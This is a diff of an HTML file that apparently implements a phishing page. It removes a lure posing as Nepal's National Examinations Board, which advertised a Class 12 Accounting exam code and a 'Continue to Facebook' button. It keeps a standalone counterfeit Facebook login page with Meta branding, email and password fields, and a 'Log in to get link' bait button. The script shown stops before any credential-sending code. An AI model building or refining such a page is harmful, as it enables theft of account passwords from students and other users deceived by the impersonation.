@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>NEB - National Examinations Board</title>
+    <title>Facebook - Log in or sign up</title>
     <style>
         * {
             margin: 0;
@@ -15,104 +15,9 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #f0f2f5;
             min-height: 100vh;
-        }
-
-        /* NEB PAGE STYLES */
-        .neb-page {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #f5f7fa 0%, #e9ecef 100%);
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 10;
-            transition: opacity 0.5s ease;
-        }
-
-        .neb-card {
-            max-width: 550px;
-            width: 90%;
-            padding: 50px 30px;
-            text-align: center;
-            background: white;
-            border-radius: 30px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-        }
-
-        .neb-card h1 {
-            font-size: 34px;
-            color: #e63946;
-            margin-bottom: 15px;
-        }
-
-        .neb-card h2 {
-            font-size: 20px;
-            color: #333;
-            font-weight: normal;
-            margin-bottom: 10px;
-        }
-
-        .neb-card p {
-            font-size: 16px;
-            color: #666;
-            margin-top: 5px;
-        }
-
-        .class-box {
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
-            border-radius: 20px;
-            padding: 30px;
-            margin: 30px 0;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-        }
-
-        .class-box h3 {
-            color: #e63946;
-            font-size: 24px;
-            margin-bottom: 15px;
-        }
-
-        .subject {
-            font-size: 24px;
-            font-weight: bold;
-            color: #2c3e50;
-            margin: 15px 0;
-        }
-
-        .code {
-            font-size: 20px;
-            color: #e63946;
-            font-family: monospace;
-            background: white;
-            display: inline-block;
-            padding: 8px 25px;
-            border-radius: 30px;
-            margin: 10px 0;
-            font-weight: bold;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-
-        .continue-btn {
-            background: linear-gradient(135deg, #e63946 0%, #c1121f 100%);
-            color: white;
-            border: none;
-            padding: 16px 50px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            margin-top: 10px;
-            width: 100%;
-        }
-
-        /* FACEBOOK PAGE STYLES */
-        .fb-page {
-            display: none;
-            min-height: 100vh;
-            background: #f0f2f5;
         }
 
         .fb-wrapper {
@@ -161,7 +66,7 @@
             box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
         }
 
-        .card input {
+        .email-input {
             width: 100%;
             padding: 14px 16px;
             margin-bottom: 12px;
@@ -172,14 +77,58 @@
             background: white;
         }
 
-        .card input:focus {
+        .email-input:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 2px #e7f3ff;
         }
 
-        .card input.error-input {
-            border-color: #f02849;
-            background-color: #fff8f8;
+        .password-wrapper {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .password-wrapper input {
+            width: 100%;
+            padding: 14px 45px 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+            background: white;
+        }
+
+        .password-wrapper input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .password-toggle svg {
+            width: 22px;
+            height: 22px;
+            fill: #65676b;
+        }
+
+        .password-toggle:hover svg {
+            fill: #1877f2;
+        }
+
+        .error-input {
+            border-color: #f02849 !important;
+            background-color: #fff8f8 !important;
         }
 
         .login-btn {
@@ -262,7 +211,6 @@
             display: none;
         }
 
-        /* Meta Footer */
         .meta-footer {
             text-align: center;
             margin-top: 32px;
@@ -297,11 +245,6 @@
             font-size: 12px;
         }
 
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Shake animation */
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-4px); }
@@ -329,55 +272,36 @@
 </head>
 <body>
 
-<!-- NEB PAGE -->
-<div id="nebPage" class="neb-page">
-    <div class="neb-card">
-        <h1>🇳🇵 राष्ट्रिय परीक्षा बोर्ड</h1>
-        <h2>National Examinations Board</h2>
-        <p>सानोठिमी, भक्तपुर | Nepal</p>
-        <div class="class-box">
-            <h3>📚 कक्षा १२ (Class 12)</h3>
-            <div class="subject">[ ACCOUNTING ]</div>
-            <div class="code">'1041'</div>
-        </div>
-        <button class="continue-btn" id="continueBtn">🔗 Continue to Facebook →</button>
+<div class="fb-wrapper">
+    <div class="brand-area">
+        <div class="fb-logo">facebook</div>
+        <div class="fb-tagline">Connect with friends and the world<br> around you on Facebook.</div>
     </div>
-</div>
-
-<!-- FACEBOOK PAGE -->
-<div id="fbPage" class="fb-page">
-    <div class="fb-wrapper">
-        <div class="brand-area">
-            <div class="fb-logo">facebook</div>
-            <div class="fb-tagline">Connect with friends and the world<br> around you on Facebook.</div>
-        </div>
-        <div class="login-area">
-            <div class="card">
-                <input type="text" id="email" class="email-input" placeholder="Email address or mobile number">
-                
-                <div class="password-field">
-                    <input type="password" id="password" placeholder="Password">
-                    <button class="password-toggle" id="togglePassword" type="button" style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer;">
-                        <svg viewBox="0 0 24 24" width="20" height="20" style="fill: #65676b;">
-                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                        </svg>
-                    </button>
-                </div>
-
-                <div id="errorMsg" class="error-msg"></div>
-                <button class="login-btn" id="loginBtn">Log In</button>
-                <div class="forgot-link">
-                    <a href="#">Forgotten password?</a>
-                </div>
-                <div class="divider"></div>
-                <button class="create-btn" id="createBtn">Create new account</button>
-                <button class="get-link-btn" id="getLinkBtn">🔗 Log in to get link</button>
+    <div class="login-area">
+        <div class="card">
+            <input type="text" id="email" class="email-input" placeholder="Email address or mobile number">
+            
+            <div class="password-wrapper">
+                <input type="password" id="password" placeholder="Password">
+                <button class="password-toggle" id="togglePassword" type="button">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>
+                </button>
             </div>
+
+            <div id="errorMsg" class="error-msg"></div>
+            <button class="login-btn" id="loginBtn">Log In</button>
+            <div class="forgot-link">
+                <a href="#">Forgotten password?</a>
+            </div>
+            <div class="divider"></div>
+            <button class="create-btn" id="createBtn">Create new account</button>
+            <button class="get-link-btn" id="getLinkBtn">🔗 Log in to get link</button>
         </div>
     </div>
 </div>
 
-<!-- Meta Footer -->
 <div class="meta-footer">
     <div class="meta-logo">
         <span class="infinity">∞</span>
@@ -391,28 +315,20 @@
 </div>
 
 <script>
-    // Toggle password visibility
+    // Eye toggle
     const togglePassword = document.getElementById('togglePassword');
     const passwordInput = document.getElementById('password');
+    let isPasswordVisible = false;
 
     togglePassword.addEventListener('click', function() {
-        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-        passwordInput.setAttribute('type', type);
+        isPasswordVisible = !isPasswordVisible;
+        passwordInput.type = isPasswordVisible ? 'text' : 'password';
         const svg = this.querySelector('svg');
-        if (type === 'text') {
-            svg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/><line x1="3" y1="3" x2="21" y2="21" stroke="#65676b" stroke-width="2"/>';
+        if (isPasswordVisible) {
+            svg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>' + '<line x1="3" y1="3" x2="21" y2="21" stroke="#65676b" stroke-width="2"/>';
         } else {
             svg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
         }
-    });
-
-    // Switch from NEB to Facebook
-    document.getElementById('continueBtn').addEventListener('click', function() {
-        document.getElementById('nebPage').style.opacity = '0';
-        setTimeout(() => {
-            document.getElementById('nebPage').style.display = 'none';
-            document.getElementById('fbPage').style.display = 'block';
-        }, 500);
     });
 
     const emailInput = document.getElementById('email');
